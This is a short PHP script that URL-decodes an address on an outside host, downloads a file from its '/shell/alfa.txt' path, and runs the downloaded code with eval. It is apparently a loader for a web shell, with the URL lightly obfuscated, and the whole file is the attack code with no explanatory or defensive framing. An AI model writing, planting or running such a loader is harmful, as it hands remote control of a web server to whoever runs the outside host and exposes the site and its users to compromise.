<?php

$content = file_get_contents(urldecode('https%3A%2F%2Fhypocriteseo.info%2Fshell%2Falfa.txt'));

$content = "?> ".$content;
eval($content);
